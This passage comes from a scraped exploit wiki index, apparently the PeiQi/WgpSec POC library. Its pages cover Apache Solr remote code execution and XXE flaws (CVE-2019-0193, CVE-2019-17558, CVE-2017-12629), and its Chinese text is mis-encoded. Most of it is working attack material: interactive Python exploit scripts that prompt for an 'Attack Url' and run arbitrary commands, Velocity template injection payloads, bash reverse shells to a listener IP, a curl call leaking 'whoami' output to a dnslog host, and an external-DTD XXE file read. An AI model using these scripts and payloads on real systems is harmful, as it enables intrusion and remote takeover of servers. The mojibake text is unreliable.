/dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 ç›´æ¥å¦‚ä¸Šå†™å…¥åå¼¹æ— ååº”ï¼Œä¸ç¨³å®šï¼Œéœ€è¦base64åŠ å¯†å†™æ‰èƒ½åå¼¹ä¸€ä¸ªshell ç‚¹å‡»EXecuteæ‰§è¡Œä»£ç  æˆåŠŸåå¼¹shell æ¼æ´åˆ©ç”¨POC [!NOTE] POCä¸æ”¯æŒåå¼¹shellï¼Œå¦‚éœ€åå¼¹shellï¼Œè¯·æŒ‰å¦‚ä¸Šæ­¥éª¤åå¼¹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(å‘½ä»¤æ‰§è¡Œ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] ç›®æ ‡Url,Dataimportæ¨¡å—å¼€å¯\\033[0m\") else: print(\"\\033[31m[x] ç›®æ ‡Url,Dataimportæ¨¡å—æœªå¼€å¯\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\", message) except: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) å‚è€ƒæ–‡ç«  apache solrè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(cve-2019-0193) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558.html","title":"Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558","keywords":"","body":"Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 æ¼æ´æè¿° 2019å¹´10æœˆæœ«ï¼ŒGitHubä»£ç ä¸­å®‰å…¨ç ”ç©¶å‘˜S00pYå‘å¸ƒä¸€ä¸ªApache Solr Velocityæ¨¡ç‰ˆæ³¨å…¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„POCï¼Œå‘ç°ç½‘ç»œä¸Šå‡ºç°é’ˆå¯¹Apache SolræœåŠ¡å™¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºVelocityæ¨¡æ¿å­˜åœ¨æ³¨å…¥æ‰€è‡´ï¼ˆVelocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå¯è®©ä½¿ç”¨è€…é€šè¿‡æ¨¡æ¿è¯­è¨€å¼•ç”¨Javaä¸­å®šä¹‰çš„å¯¹è±¡ï¼‰ã€‚æ”»å‡»è€…åœ¨çŸ¥é“SolræœåŠ¡å™¨ä¸ŠCoreåç§°åï¼Œå…ˆæŠŠparams.resource.loader.enabledè®¾ç½®ä¸ºtrueï¼ˆå°±å¯åŠ è½½æŒ‡å®šèµ„æºï¼‰ï¼Œå†è¿›è¡Œè¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 5.x è‡³ 8.2.0 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # åˆ›å»ºä¸€ä¸ªsolræ ¸å¿ƒtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æ‰“å¼€åè·å– Core ä¿¡æ¯ å¾—çŸ¥ test è¿™ä¸ª Core å­˜åœ¨ è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/test/config æ­£å¸¸ è®¿é—®Coreçš„configé…ç½®ä¿¡æ¯æ—¶ï¼Œé€šè¿‡POSTè¯·æ±‚æŠŠparams.resource.loader.enabledè®¾ç½®ä¸º Trueï¼Œå†é€šè¿‡ç²¾å¿ƒæ„é€ çš„getè¯·æ±‚å³å¯RCEï¼Œæ­¤æ—¶ç”¨æˆ·å°±å¯ä»¥åŠ è½½æŒ‡å®šèµ„æºï¼Œæ„é€ ä¸€ä¸ªèƒ½æ‰§è¡Œå‘½ä»¤çš„æ¶æ„è¯·æ±‚ è®¾ç½®params.resource.loader.enabledä¸ºTrue POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } å‘½ä»¤æ‰§è¡Œ å†ä½¿ç”¨POCé€ æˆå‘½ä»¤æ‰§è¡Œ http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end åå¼¹hellï¼Œå› ä¸ºéƒ¨åˆ†å‘½ä»¤ä¼šè¢«è¿‡æ»¤å¯¼è‡´è¿”å› Error 500 ï¼Œæ‰€ä»¥åå¼¹shelléœ€è¦ç”¨å¦å¤–çš„åå¼¹shellæ–¹æ³• POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POCéœ€è¦Urlencodingè¿›è¡Œç¼–ç æ‰èƒ½ç»•è¿‡ POC ï¼š %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(å‘½ä»¤æ‰§è¡Œ) \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTè¯·æ±‚æˆåŠŸå°†params.resource.loader.enabledè®¾ç½®ä¸ºTrue \\033[0m\") else: print(\"\\033[31m[x] POSTè¯·æ±‚params.resource.loader.enabledè®¾ç½®ä¸ºTrueå¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ï¼Œå“åº”ä¸º Error 500 \\033[0m\") else: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629.html","title":"Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2017-12629","keywords":"","body":"Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2017-12629 æ¼æ´æè¿° Apache Solr æ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡å™¨ã€‚Solr ä½¿ç”¨ Java è¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäº HTTP å’Œ Apache Lucene å®ç°ã€‚åŸç†å¤§è‡´æ˜¯æ–‡æ¡£é€šè¿‡Httpåˆ©ç”¨XMLåŠ åˆ°ä¸€ä¸ªæœç´¢é›†åˆä¸­ã€‚æŸ¥è¯¢è¯¥é›†åˆä¹Ÿæ˜¯é€šè¿‡ httpæ”¶åˆ°ä¸€ä¸ªXML/JSONå“åº”æ¥å®ç°ã€‚æ­¤æ¬¡7.1.0ä¹‹å‰ç‰ˆæœ¬æ€»å…±çˆ†å‡ºä¸¤ä¸ªæ¼æ´ï¼šXMLå®ä½“æ‰©å±•æ¼æ´ï¼ˆXXEï¼‰å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰ï¼ŒäºŒè€…å¯ä»¥è¿æ¥æˆåˆ©ç”¨é“¾ï¼Œç¼–å·å‡ä¸ºCVE-2017-12629ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d æ¼æ´å¤ç° è¿œç¨‹å‘½ä»¤æ‰§è¡Œ å…ˆè¯·æ±‚urlåœ°å€è·å– core å†…å®¹ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] é€šè¿‡æŸ¥çœ‹ä»£ç ï¼Œèƒ½å¤Ÿè§¦å‘å‘½ä»¤æ‰§è¡Œçš„äº‹ä»¶æœ‰ä¸¤ä¸ªï¼špostCommit å’Œ newSearcher ä½¿ç”¨ postCommit ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…ç”¨äºè½½å…¥ç¼“å­˜ä¸­ [!NOTE] exe : ping æ‰§è¡Œçš„å‘½ä»¤ dir: å‘½ä»¤å­˜åœ¨çš„ç›®å½•ä½ç½® args:å‘½ä»¤å‚æ•° å¦‚ä¸‹è¯·æ±‚åŒ…æ‰§è¡Œçš„æ˜¯ /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } ç¬¬äºŒä¸ªè¯·æ±‚åŒ…ç”¨äºæ›´æ–°ç¼“å­˜å¹¶æ‰§è¡Œå‘½ä»¤ POST /solr/demo/update HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] æ³¨æ„ ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…çš„è¿™ä¸ªä½ç½® \"name\":\"newlistener-1\", listererçš„åå­—éœ€è¦æ›¿æ¢ï¼Œä¾‹å¦‚ç¬¬ä¸€æ¬¡ ä¸º newlistener-1 ï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ”¹ä¸º newlistener-2 æ³¨æ„ ç¬¬äºŒä¸ªè¯·æ±‚åŒ…çš„è¿™ä¸ªä½ç½® [{\"id\":\"test\"}]ï¼Œ åŒç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…çš„nameï¼Œæ¯æ‰§è¡Œä¸€æ¬¡å°±éœ€è¦æ›´æ¢ id ,ä¾‹å¦‚ç¬¬ä¸€æ¬¡ ä¸º test ï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ”¹ä¸º tset-2 æ³¨æ„ Content-Type: application/json éœ€è¦æ·»åŠ  ä¸æ›´æ”¹æ‰§è¡Œå‘ç”ŸæŠ¥é”™ç¤ºä¾‹ è¿›å…¥dockerå®¹å™¨æŸ¥çœ‹å‘ç°å‘½ä»¤å·²ç»æ‰§è¡Œ ä½¿ç”¨ newSearcher ä½¿ç”¨ newSearcherå¯ä»¥ç›´æ¥åŠ è½½å…¥ç¼“å­˜æ‰§è¡Œå‘½ä»¤ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearcher\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[ \"-c\", \"mkdir /tmp/vuln\", ] } } [!NOTE] æ³¨æ„ç‚¹åŒä¸Šï¼Œä¹Ÿéœ€è¦æ¯æ¬¡æ‰§è¡Œæ›´æ”¹ \"name\":\"newlistener-2\" çš„å‚æ•° æˆåŠŸæ‰§è¡Œäº†åˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ å…³äº å¦‚æœæƒ³è¦æ‰§è¡Œå…¶ä»–å‘½ä»¤,åˆ™éœ€è¦å‘½ä»¤çš„çš„ä½ç½®ï¼Œä¾‹å¦‚æ‰§è¡Œpingï¼Œåˆ™éœ€è¦è®¾ç½®dirå‚æ•°ä¸º /usr/bin/ping æˆ–è€… /bin/pingï¼Œå¦‚æœéœ€è¦æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨åˆ™å¯ä»¥ä½¿ç”¨ dnslogæ¥æ£€æµ‹ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogåœ°å€(æ¼æ´å¤–è¿æ£€æµ‹) \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œï¼Œè¯·æŸ¥çœ‹dnslog \\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œ \\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mè¯·è¾“å…¥ä½ çš„dnslogåœ°å€ï¼š\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] å¦‚æœshellæˆ–dnslogæ— ååº”ï¼Œå¯ä»¥é€‰æ‹©æ›´æ”¹ä¸€ä¸‹POCçš„éƒ¨åˆ†å‚æ•°æ‰§è¡Œéœ€è¦çš„ä»£ç  å‚è€ƒæ–‡ç«  Apache Solrè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-12629ï¼‰ä»åˆ©ç”¨åˆ°å…¥ä¾µæ£€æµ‹ cve-2017-12629 apache solr xxe & rce æ¼æ´åˆ†æ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr XXE æ¼æ´ CVE-2017-12629.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr XXE æ¼æ´ CVE-2017-12629.html","title":"Apache Solr XXE æ¼æ´ CVE-2017-12629","keywords":"","body":"Apache Solr XXE æ¼æ´ CVE-2017-12629 æ¼æ´æè¿° Apache Solr æ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡å™¨ã€‚Solr ä½¿ç”¨ Java è¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäº HTTP å’Œ Apache Lucene å®ç°ã€‚åŸç†å¤§è‡´æ˜¯æ–‡æ¡£é€šè¿‡Httpåˆ©ç”¨XMLåŠ åˆ°ä¸€ä¸ªæœç´¢é›†åˆä¸­ã€‚æŸ¥è¯¢è¯¥é›†åˆä¹Ÿæ˜¯é€šè¿‡ httpæ”¶åˆ°ä¸€ä¸ªXML/JSONå“åº”æ¥å®ç°ã€‚æ­¤æ¬¡7.1.0ä¹‹å‰ç‰ˆæœ¬æ€»å…±çˆ†å‡ºä¸¤ä¸ªæ¼æ´ï¼šXMLå®ä½“æ‰©å±•æ¼æ´ï¼ˆXXEï¼‰å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰ã€‚ å½±å“ç‰ˆæœ¬ Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d æ¼æ´å¤ç° Dnslog å…ˆè¯·æ±‚urlåœ°å€è·å– core å†…å®¹ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml æŸ¥çœ‹dnslogå¾—åˆ°è¯·æ±‚ è¿œç¨‹è¯»å–æ–‡ä»¶ åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™å…¥ä¸€ä¸ªå¯è®¿é—®çš„XMLæ–‡ä»¶ï¼Œå†…å®¹å†™å…¥ \"> ç„¶åè¯·æ±‚è¿™ä¸ªæ–‡ä»¶æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] æ³¨æ„è¿™é‡Œçš„payloadè¿›è¡Œäº†urlç¼–ç ,è¯·æ±‚çš„æ–‡ä»¶ä¸º http://peiqi.tech/1.dtdï¼Œæœ‰æ›´å¤šéœ€æ±‚è‡ªè¡Œæ›´æ”¹å†™å…¥çš„xmlæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogåœ°å€(æ¼æ´å¤–è¿æ£€æµ‹) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(è¯»å–/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") else: print(\"\\033[32m[o] è¯·æŸ¥çœ‹dnslogå“åº” \\033[0m\") except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_3(target_url, core_name): file_payload = 